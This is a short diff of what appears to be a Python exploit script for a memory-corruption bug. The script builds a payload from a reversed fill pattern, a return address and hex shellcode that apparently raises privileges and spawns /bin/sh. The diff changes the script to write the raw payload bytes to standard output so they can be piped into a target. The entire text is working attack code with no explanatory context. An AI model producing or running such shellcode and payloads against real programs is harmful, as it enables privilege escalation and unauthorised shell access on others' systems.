@@ -21,11 +21,11 @@ shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e13
 ########################################################################################### <- append an endline (0x0a, \n)
 
 payload = revert(fill) + revert(raddr) + (shellcode)
-print(payload)
+#print(payload)
 
 import binascii
 
 b = binascii.unhexlify(payload)
-with open('input.txt','wb+') as f:
+with open('/dev/fd/1','wb') as f:
     f.write(b)
 
